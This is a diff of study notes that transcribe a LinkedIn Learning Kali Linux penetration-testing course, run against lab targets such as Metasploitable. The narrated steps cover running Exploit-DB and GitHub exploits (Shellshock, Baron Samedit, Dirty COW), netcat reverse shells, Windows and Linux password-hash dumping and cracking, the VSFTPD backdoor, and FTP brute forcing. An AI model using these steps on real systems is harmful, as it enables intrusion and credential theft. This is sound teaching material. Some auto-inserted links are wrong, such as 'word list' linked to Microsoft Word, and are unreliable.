@@ -1442,17 +1426,17 @@ created: 2026-05-02
 >
 > **[0:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=4)** The first thing we need to do is to select an exploit.
 >
-> **[0:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=7)** And if we're lucky, we'll find one already prepared inside Metasploit.
+> **[0:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=7)** And if we're lucky, we'll find one already prepared inside [[Metasploit]].
 >
 > **[0:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=12)** However, sometimes we need to pick up a raw exploit and make it usable from Kali.
 >
-> **[0:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=17)** There are many sources we could use for this, but the most likely source will be exploitDB.
+> **[0:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=17)** There are many sources we could use for this, but the most likely source will be [[Exploit-DB|exploitDB]].
 >
 > **[0:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=24)** Exploits can come in any number of languages.
 >
 > **[0:27](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=27)** For Metasploit modules, the exploits are written in Ruby and use the Metasploit Framework.
 >
-> **[0:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=32)** C, C++, Python, and Perl are commonly seen in exploitDB.
+> **[0:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=32)** C, C++, [[Python (Programming Language)|Python]], and Perl are commonly seen in exploitDB.
 >
 > **[0:37](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980&t=37)** And sometimes we get Ruby exploits which are not yet in Metasploit.
 >
@@ -1460,17 +1444,16 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Python (Programming Language)|Python]] (1)
+> **Frameworks & Libraries:** [[Metasploit]] (4), [[Exploit-DB|Exploitdb]] (2), [[Python (Programming Language)|Python]] (1)
 > **CLI Commands:** ruby (2), find (1), make (1), python (1)
 > **Code Identifiers:** exploitdb (2)
 > **Speakers:** - [instructor] (1)
 
-#### Exploiting with Python
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980)
+#### [Exploiting with Python](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=0)** - [Instructor] Let's look at how we use Python exploits.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=0)** - [Instructor] Let's look at how we use [[Python (Programming Language)|Python]] exploits.
 >
 > **[0:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=3)** In 2014, the Shellshock exploit was detected.
 >
@@ -1488,7 +1471,7 @@ created: 2026-05-02
 >
 > **[0:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=39)** We'll copy this into our home directory.
 >
-> **[0:42](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=42)** Copy /usr/share/exploitdb/exploits/ Copy /usr/share/exploitdb/exploits/ and it's in Linux remote, and it's called 34900.py.
+> **[0:42](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=42)** Copy /usr/share/[[Exploit-DB|exploitdb]]/exploits/ Copy /usr/share/exploitdb/exploits/ and it's in [[Linux]] remote, and it's called 34900.py.
 >
 > **[0:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=57)** and it's in Linux remote, and it's called 34900.py.
 >
@@ -1518,7 +1501,7 @@ created: 2026-05-02
 >
 > **[1:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=112)** The open and close brackets, curly brackets, and colon, semi-colon.
 >
-> **[1:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=117)** Together with the Bash call for a Bash shell, or a Netcat connection back serving up a Bash shell for bind and reverse payloads respectively.
+> **[1:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=117)** Together with the Bash call for a Bash shell, or a [[Netcat]] connection back serving up a Bash shell for bind and reverse payloads respectively.
 >
 > **[2:09](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-python?u=76281980&t=129)** The script will either try the set of pages provided in the call, or use a small default set of CGI pages that we can see here.
 >
@@ -1530,7 +1513,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Linux]] (2), [[Python (Programming Language)|Python]] (1)
+> **Frameworks & Libraries:** [[Exploit-DB|Exploitdb]] (2), [[Linux]] (2), [[Python (Programming Language)|Python]] (1), [[Netcat]] (1)
 > **File Paths:** shellshock.py (5), 34900.py (2)
 > **Tools:** bash (5), terminal (1)
 > **Env Vars:** cve (2), cgi (2), http (1)
@@ -1539,8 +1522,7 @@ created: 2026-05-02
 > **Ports:** port 80 (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exploiting with Perl
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-perl?u=76281980)
+#### [Exploiting with Perl](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-perl?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1558,7 +1540,7 @@ created: 2026-05-02
 >
 > **[0:27](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-perl?u=76281980&t=27)** Copy, slash, user, slash, share, slash, exploit DB, slash, exploits.
 >
-> **[0:37](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-perl?u=76281980&t=37)** And we want windows, remote, 8200 dot PL.
+> **[0:37](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-perl?u=76281980&t=37)** And we want [[Windows]], remote, 8200 dot PL.
 >
 > **[0:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-perl?u=76281980&t=45)** And I'll just copy that into a 8200 dot PL.
 >
@@ -1596,8 +1578,7 @@ created: 2026-05-02
 > **Definitions:** is a  (2)
 > **Speakers:** - guildftpd (1)
 
-#### Exploiting with C
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980)
+#### [Exploiting with C](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1605,9 +1586,9 @@ created: 2026-05-02
 >
 > **[0:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=3)** Let's take a look at the 2021 Baron Samedit exploit, which enables privilege escalation.
 >
-> **[0:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=10)** We'll download this from Github.
+> **[0:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=10)** We'll download this from [[GitHub]].
 >
-> **[0:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=12)** Git clone https [github.com](https://github.com) 1N53C CVE-2021-3156-POC.git.
+> **[0:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=12)** [[Git]] clone https [github.com](https://github.com) 1N53C CVE-2021-3156-POC.git.
 >
 > **[0:30](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=30)** Then we'll clone into samedit.
 >
@@ -1615,7 +1596,7 @@ created: 2026-05-02
 >
 > **[0:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=40)** And we can see we have two C files, hax.C and lib.C Let's take a look at hax.C.
 >
-> **[0:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=52)** If we scroll down, we can see the versions of Linux which have been tested against.
+> **[0:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=52)** If we scroll down, we can see the versions of [[Linux]] which have been tested against.
 >
 > **[0:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=57)** And a little further down, we can see the usage details.
 >
@@ -1648,12 +1629,11 @@ created: 2026-05-02
 > **UI Navigation:** scroll down (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exploiting with CPP
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980)
+#### [Exploiting with CPP](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=0)** - [Instructor] The Dirty COW exploit enables us to achieve privilege escalation in Linux.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=0)** - [Instructor] The Dirty COW exploit enables us to achieve privilege escalation in [[Linux]].
 >
 > **[0:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=5)** And it's a popular exploit for doing this.
 >
@@ -1669,7 +1649,7 @@ created: 2026-05-02
 >
 > **[0:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=29)** I'll copy it down to a file called DirtyCow.cpp.
 >
-> **[0:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=34)** cp /usr/share/exploitdb/exploits And it's in linux/local/40847.cpp
+> **[0:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=34)** cp /usr/share/[[Exploit-DB|exploitdb]]/exploits And it's in linux/local/40847.cpp
 >
 > **[0:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=52)** And we'll call it DirtyCow.cpp Let's take a look at it.
 >
@@ -1697,7 +1677,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Linux]] (2)
+> **Frameworks & Libraries:** [[Linux]] (2), [[Exploit-DB|Exploitdb]] (1)
 > **File Paths:** dirtycow.cpp (4), linux/local/40847.cpp (1)
 > **Speakers:** - [instructor] (1), - pedantic (1), - std (1), - pthread (1)
 > **Env Vars:** cow (2)
@@ -1709,18 +1689,17 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Obtaining Windows passwords
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980)
+#### [Obtaining Windows passwords](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=1)** - [Instructor] The easiest way to access a system is to walk in the front door using a valid set of credentials.
 >
-> **[0:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=6)** And when we carry out penetration testing, we'll often be looking at a network rather than just a single host.
+> **[0:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=6)** And when we carry out [[Penetration Testing]], we'll often be looking at a network rather than just a single host.
 >
 > **[0:13](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=13)** So getting access to a password on one machine may well give us that front door access for another.
 >
-> **[0:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=19)** Let's have a look at what we need to do to collect credentials from a Windows target.
+> **[0:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=19)** Let's have a look at what we need to do to collect credentials from a [[Windows]] target.
 >
 > **[0:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=24)** We'll start by opening the Windows Command Shell as administrator.
 >
@@ -1728,7 +1707,7 @@ created: 2026-05-02
 >
 > **[0:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=33)** And we can then get more details by selecting one.
 >
-> **[0:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=40)** Windows credentials may come from an active directory account or maybe stored locally.
+> **[0:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=40)** Windows credentials may come from an [[Active Directory]] account or maybe stored locally.
 >
 > **[0:46](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=46)** Passwords are stored in two ways.
 >
@@ -1774,7 +1753,7 @@ created: 2026-05-02
 >
 > **[2:46](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=166)** A similar tool is pwdump and it uses the same command line parameters.
 >
-> **[2:58](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=178)** We can also use a Python script called secretdump.py which comes as an example in the in packet tool.
+> **[2:58](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=178)** We can also use a [[Python (Programming Language)|Python]] script called secretdump.py which comes as an example in the in packet tool.
 >
 > **[3:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=186)** We can run that using Python and again, reading the sam and system dumps.
 >
@@ -1792,13 +1771,13 @@ created: 2026-05-02
 >
 > **[4:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=241)** All I need to do now is to run the hashdump command and we get the hashes.
 >
-> **[4:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=247)** Having got our hashes, we can now run these through an offline cracking program, such as John the ripper, to attempt to crack them and recover the passwords.
+> **[4:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=247)** Having got our hashes, we can now run these through an offline cracking program, such as [[John the Ripper]], to attempt to crack them and recover the passwords.
 >
 > **[4:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=255)** We can do that by copying the output from the hashdump into a file.
 >
 > **[4:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=260)** I've copied them into my hash.txt.
 >
-> **[4:22](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=262)** So let's try cracking them using the Rockyou.txt word list I'll force NT old format for this run.
+> **[4:22](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=262)** So let's try cracking them using the Rockyou.txt [[Microsoft Word|word]] list I'll force NT old format for this run.
 >
 > **[4:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=273)** And we can see the account credentials that have been recovered.
 >
@@ -1834,7 +1813,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (7), [[Security]] (3), database (3), [[Python (Programming Language)|Python]] (2), [[Penetration Testing]] (1)
+> **Frameworks & Libraries:** [[Windows]] (7), [[Python (Programming Language)|Python]] (2), [[Penetration Testing]] (1), [[Active Directory]] (1), [[John the Ripper]] (1)
 > **File Paths:** rockyou.txt (2), secretdump.py (1), hash.txt (1)
 > **CLI Commands:** python (2), find (1), make (1)
 > **Env Vars:** lan (1), ntlm (1)
@@ -1843,14 +1822,13 @@ created: 2026-05-02
 > **Prerequisites:** set up (1), install (1)
 > **Cross-References:** coming up (1)
 
-#### Obtaining Linux passwords
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980)
+#### [Obtaining Linux passwords](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=0)** - [Instructor] We've looked at how we might obtain Windows passwords.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=0)** - [Instructor] We've looked at how we might obtain [[Windows]] passwords.
 >
-> **[0:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=3)** So, let's now look at collecting a Linux target credentials.
+> **[0:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=3)** So, let's now look at collecting a [[Linux]] target credentials.
 >
 > **[0:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=7)** On a standard Linux system, the user accounts are held in the /etc/password file.
 >
@@ -1872,19 +1850,19 @@ created: 2026-05-02
 >
 > **[0:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=57)** I've extracted the set of credentials from a target system.
 >
-> **[1:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=61)** In order to recover the passwords, I need to combine the two extracted files back into a single password file, using John the Rippers and shadow tool.
+> **[1:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=61)** In order to recover the passwords, I need to combine the two extracted files back into a single password file, using [[John the Ripper|John]] the Rippers and shadow tool.
 >
 > **[1:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=74)** Okay, let's look at the file full that we've created.
 >
 > **[1:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=80)** We can see that the password hashes have been reinserted into the password file, second field.
 >
-> **[1:28](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=88)** Now we run a password crack using John the Ripper to recover the passwords.
+> **[1:28](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=88)** Now we run a password crack using [[John the Ripper]] to recover the passwords.
 >
 > **[1:38](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=98)** And we can see that we've extracted a lot of credentials.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Linux]] (2), [[Windows]] (1), [[Security]] (1)
+> **Frameworks & Libraries:** [[Linux]] (2), [[Windows]] (1), [[John the Ripper|John]] (1), [[John the Ripper]] (1)
 > **Env Vars:** gid (1)
 > **Speakers:** - [instructor] (1)
 
@@ -1893,8 +1871,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Targeting Metasploitable
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/targeting-metasploitable?u=76281980)
+#### [Targeting Metasploitable](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/targeting-metasploitable?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1902,7 +1879,7 @@ created: 2026-05-02
 >
 > **[0:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/targeting-metasploitable?u=76281980&t=10)** The first task in understanding a target is to scan it.
 >
-> **[0:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/targeting-metasploitable?u=76281980&t=14)** Let's scan metasploitable, and we'll run a TCP port scan, nmap -PS -sV 10.0.2.8.
+> **[0:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/targeting-metasploitable?u=76281980&t=14)** Let's scan metasploitable, and we'll run a TCP port scan, [[Nmap]] -PS -sV 10.0.2.8.
 >
 > **[0:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/targeting-metasploitable?u=76281980&t=32)** This shows many open services and we're literally spoiled for choice.
 >
@@ -1910,20 +1887,19 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (1)
+> **Frameworks & Libraries:** [[Nmap]] (1)
 > **Code Identifiers:** sv (1)
 > **Env Vars:** tcp (1)
 > **Versions:** 10.0.2 (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exploiting VSFTPD
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980)
+#### [Exploiting VSFTPD](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=0)** - [Instructor] Let's take a look at the FTP service running on port 21 on Metasploitable.
 >
-> **[0:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=5)** And to remind ourselves what it is, We'll run NMAP minus PS, minus SV, minus port 21, 10.0.2.8 And we can see it's VSFTPD 2.3.4.
+> **[0:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=5)** And to remind ourselves what it is, We'll run [[Nmap]] minus PS, minus SV, minus port 21, 10.0.2.8 And we can see it's VSFTPD 2.3.4.
 >
 > **[0:21](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=21)** Let's see if we can get in with anonymous access, 10.0.2.8, and we'll go a anonymous and we'll put in our email as the password.
 >
@@ -1939,9 +1915,9 @@ created: 2026-05-02
 >
 > **[1:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=60)** And there's a few exploits here, including a backdoor command execution in ruby.
 >
-> **[1:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=66)** So it's likely a Metasploit.
+> **[1:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=66)** So it's likely a [[Metasploit]].
 >
-> **[1:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=68)** So let's open up MSF console, and we'll search for the VSFTPD exploits.
+> **[1:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=68)** So let's open up [[Metasploit|MSF]] console, and we'll search for the VSFTPD exploits.
 >
 > **[1:21](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=81)** And we can see it's here.
 >
@@ -1993,7 +1969,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Search]] (1)
+> **Frameworks & Libraries:** [[Metasploit]] (2), [[Nmap]] (1), [[Metasploit|Msf]] (1)
 > **Env Vars:** vsftpd (6), ftp (3), nmap (1), msf (1), cmd (1)
 > **Versions:** 10.0.2 (6), 2.3.4 (2)
 > **Ports:** port 21 (2)
@@ -2002,8 +1978,7 @@ created: 2026-05-02
 > **Tools:** terminal (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exploiting with ProFTPD
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980)
+#### [Exploiting with ProFTPD](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2033,9 +2008,9 @@ created: 2026-05-02
 >
 > **[0:59](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=59)** It looks like we might have to try harder to exploit this service.
 >
-> **[1:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=63)** Let's try Metasploit, FTP brute force login.
+> **[1:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=63)** Let's try [[Metasploit]], FTP brute force login.
 >
-> **[1:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=67)** MSF console.
+> **[1:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=67)** [[Metasploit|MSF]] console.
 >
 > **[1:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=71)** Okay, so we'll use the auxiliary scanner for FTP and we'll try FTP login.
 >
@@ -2049,7 +2024,7 @@ created: 2026-05-02
 >
 > **[1:58](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=118)** I've already created a blank file, which we'll use for the password file to save time.
 >
-> **[2:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=123)** Set user underscore file to user share word lists, Metasploit Unix underscore users dot text.
+> **[2:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=123)** Set user underscore file to user share [[Microsoft Word|word]] lists, Metasploit Unix underscore users dot text.
 >
 > **[2:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=143)** Set user pass file and that's our empty file, empty dot text.
 >
@@ -2065,7 +2040,7 @@ created: 2026-05-02
 >
 > **[2:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=172)** All right, we're finished and we've found three sets of credentials.
 >
-> **[2:55](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=175)** User user, service service and Postgres Postgres.
+> **[2:55](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=175)** User user, service service and [[PostgreSQL|Postgres]] Postgres.
 >
